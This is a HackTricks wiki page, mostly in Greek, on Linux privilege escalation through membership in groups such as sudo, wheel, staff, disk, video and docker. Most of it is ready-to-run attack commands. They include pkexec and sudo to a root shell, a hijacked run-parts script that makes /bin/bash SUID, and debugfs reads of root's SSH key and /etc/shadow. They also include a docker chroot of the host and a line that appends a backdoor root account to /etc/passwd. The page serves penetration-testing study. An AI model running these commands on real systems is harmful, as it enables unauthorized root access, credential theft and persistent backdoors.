# Interesting Groups - Linux Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Sudo/Admin Groups

### **PE - Method 1**

**Μερικές φορές**, **κατά προεπιλογή (ή επειδή κάποιο λογισμικό το χρειάζεται)** μέσα στο **/etc/sudoers** αρχείο μπορείς να βρεις μερικές από αυτές τις γραμμές:
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα sudo ή admin μπορεί να εκτελέσει οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για **να γίνεις root μπορείς απλά να εκτελέσεις**:
```
sudo su
```
### PE - Μέθοδος 2

Βρείτε όλα τα suid δυαδικά και ελέγξτε αν υπάρχει το δυαδικό **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Αν διαπιστώσετε ότι το δυαδικό αρχείο **pkexec είναι ένα SUID δυαδικό αρχείο** και ανήκετε σε **sudo** ή **admin**, μπορείτε πιθανώς να εκτελέσετε δυαδικά αρχεία ως sudo χρησιμοποιώντας το `pkexec`.\
Αυτό συμβαίνει επειδή συνήθως αυτές είναι οι ομάδες μέσα στην **πολιτική polkit**. Αυτή η πολιτική βασικά προσδιορίζει ποιες ομάδες μπορούν να χρησιμοποιούν το `pkexec`. Ελέγξτε το με:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Εκεί θα βρείτε ποιες ομάδες επιτρέπεται να εκτελούν **pkexec** και **κατά προεπιλογή** σε ορισμένες διανομές linux οι ομάδες **sudo** και **admin** εμφανίζονται.

Για **να γίνετε root μπορείτε να εκτελέσετε**:
```bash
pkexec "/bin/sh" #You will be prompted for your user password
```
Αν προσπαθήσετε να εκτελέσετε **pkexec** και λάβετε αυτό το **σφάλμα**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
**Δεν είναι επειδή δεν έχετε δικαιώματα αλλά επειδή δεν είστε συνδεδεμένοι χωρίς GUI**. Και υπάρχει μια λύση για αυτό το ζήτημα εδώ: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Χρειάζεστε **2 διαφορετικές ssh συνεδρίες**:

{% code title="session1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="session2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**Μερικές φορές**, **κατά προεπιλογή** μέσα στο **/etc/sudoers** αρχείο μπορείς να βρεις αυτή τη γραμμή:
```
%wheel	ALL=(ALL:ALL) ALL
```
Αυτό σημαίνει ότι **οποιοσδήποτε χρήστης ανήκει στην ομάδα wheel μπορεί να εκτελεί οτιδήποτε ως sudo**.

Αν αυτό ισχύει, για **να γίνεις root μπορείς απλά να εκτελέσεις**:
```
sudo su
```
## Shadow Group

Χρήστες από την **ομάδα shadow** μπορούν να **διαβάσουν** το **/etc/shadow** αρχείο:
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
So, read the file and try to **crack some hashes**.

## Staff Group

**staff**: Επιτρέπει στους χρήστες να προσθέτουν τοπικές τροποποιήσεις στο σύστημα (`/usr/local`) χωρίς να χρειάζονται δικαιώματα root (σημειώστε ότι τα εκτελέσιμα αρχεία στο `/usr/local/bin` είναι στη μεταβλητή PATH οποιουδήποτε χρήστη, και μπορεί να "υπερκαλύψουν" τα εκτελέσιμα αρχεία στο `/bin` και `/usr/bin` με το ίδιο όνομα). Συγκρίνετε με την ομάδα "adm", η οποία σχετίζεται περισσότερο με την παρακολούθηση/ασφάλεια. [\[source\]](https://wiki.debian.org/SystemGroups)

In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Αν μπορέσουμε να καταλάβουμε μερικά προγράμματα στο `/usr/local`, μπορούμε εύκολα να αποκτήσουμε δικαιώματα root.

Η κατάληψη του προγράμματος `run-parts` είναι ένας εύκολος τρόπος για να αποκτήσουμε δικαιώματα root, επειδή τα περισσότερα προγράμματα θα εκτελούν ένα `run-parts` όπως (crontab, κατά την είσοδο μέσω ssh).
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
ή Όταν συνδέεται μια νέα συνεδρία ssh.
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Εκμετάλλευση**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk Group

Αυτή η προνομιακή πρόσβαση είναι σχεδόν **ισοδύναμη με την πρόσβαση root** καθώς μπορείτε να έχετε πρόσβαση σε όλα τα δεδομένα μέσα στη μηχανή.

Files:`/dev/sd[a-z][1-9]`
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
Σημειώστε ότι χρησιμοποιώντας το debugfs μπορείτε επίσης να **γράφετε αρχεία**. Για παράδειγμα, για να αντιγράψετε το `/tmp/asd1.txt` στο `/tmp/asd2.txt` μπορείτε να κάνετε:
```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Ωστόσο, αν προσπαθήσετε να **γράψετε αρχεία που ανήκουν στον root** (όπως το `/etc/shadow` ή το `/etc/passwd`) θα λάβετε ένα "**Permission denied**" σφάλμα.

## Ομάδα Βίντεο

Χρησιμοποιώντας την εντολή `w` μπορείτε να βρείτε **ποιος είναι συνδεδεμένος στο σύστημα** και θα εμφανίσει μια έξοδο όπως η παρακάτω:
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Το **tty1** σημαίνει ότι ο χρήστης **yossi είναι συνδεδεμένος φυσικά** σε ένα τερματικό στη μηχανή.

Η **ομάδα video** έχει πρόσβαση για να δει την έξοδο της οθόνης. Βασικά, μπορείτε να παρατηρήσετε τις οθόνες. Για να το κάνετε αυτό, πρέπει να **πάρτε την τρέχουσα εικόνα στην οθόνη** σε ακατέργαστα δεδομένα και να βρείτε την ανάλυση που χρησιμοποιεί η οθόνη. Τα δεδομένα της οθόνης μπορούν να αποθηκευτούν στο `/dev/fb0` και μπορείτε να βρείτε την ανάλυση αυτής της οθόνης στο `/sys/class/graphics/fb0/virtual_size`
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Για να **ανοίξετε** την **ακατέργαστη εικόνα** μπορείτε να χρησιμοποιήσετε το **GIMP**, να επιλέξετε το \*\*`screen.raw` \*\* αρχείο και να επιλέξετε ως τύπο αρχείου **Raw image data**:

![](<../../../.gitbook/assets/image (463).png>)

Στη συνέχεια, τροποποιήστε το Πλάτος και το Ύψος στις διαστάσεις που χρησιμοποιούνται στην οθόνη και ελέγξτε διαφορετικούς Τύπους Εικόνας (και επιλέξτε αυτόν που δείχνει καλύτερα την οθόνη):

![](<../../../.gitbook/assets/image (317).png>)

## Ομάδα Root

Φαίνεται ότι από προεπιλογή οι **μέλη της ομάδας root** θα μπορούσαν να έχουν πρόσβαση για **τροποποίηση** ορισμένων αρχείων ρυθμίσεων **υπηρεσιών** ή ορισμένων αρχείων **βιβλιοθηκών** ή **άλλων ενδιαφερόντων πραγμάτων** που θα μπορούσαν να χρησιμοποιηθούν για την κλιμάκωση δικαιωμάτων...

**Ελέγξτε ποια αρχεία μπορούν να τροποποιήσουν τα μέλη του root**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker Group

Μπορείτε να **συνδέσετε το ριζικό σύστημα αρχείων της μηχανής φιλοξενίας σε έναν τόμο της παρουσίας**, έτσι ώστε όταν η παρουσία ξεκινά, να φορτώνει αμέσως ένα `chroot` σε αυτόν τον τόμο. Αυτό σας δίνει ουσιαστικά δικαιώματα root στη μηχανή.
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```
Τέλος, αν δεν σας αρέσει καμία από τις προηγούμενες προτάσεις, ή αν δεν λειτουργούν για κάποιο λόγο (docker api firewall;), μπορείτε πάντα να **τρέξετε ένα προνομιακό κοντέινερ και να διαφύγετε από αυτό** όπως εξηγείται εδώ:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Αν έχετε δικαιώματα εγγραφής πάνω στο docker socket διαβάστε [**αυτή την ανάρτηση σχετικά με το πώς να κλιμακώσετε τα δικαιώματα εκμεταλλευόμενοι το docker socket**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## lxc/lxd Group

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Adm Group

Συνήθως οι **μέλη** της ομάδας **`adm`** έχουν δικαιώματα να **διαβάζουν αρχεία καταγραφής** που βρίσκονται μέσα στο _/var/log/_.\
Επομένως, αν έχετε παραβιάσει έναν χρήστη μέσα σε αυτή την ομάδα, θα πρέπει σίγουρα να ρίξετε μια **ματιά στα αρχεία καταγραφής**.

## Auth group

Μέσα στο OpenBSD, η **auth** ομάδα συνήθως μπορεί να γράφει στους φακέλους _**/etc/skey**_ και _**/var/db/yubikey**_ αν χρησιμοποιούνται.\
Αυτά τα δικαιώματα μπορεί να εκμεταλλευτούν με την παρακάτω εκμετάλλευση για να **κλιμακώσουν τα δικαιώματα** σε root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)

{% hint style="success" %}
Μάθετε & εξασκηθείτε στο AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Μάθετε & εξασκηθείτε στο GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Υποστήριξη HackTricks</summary>

* Ελέγξτε τα [**σχέδια συνδρομής**](https://github.com/sponsors/carlospolop)!
* **Εγγραφείτε στην** 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα telegram**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε κόλπα hacking υποβάλλοντας PRs στα** [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
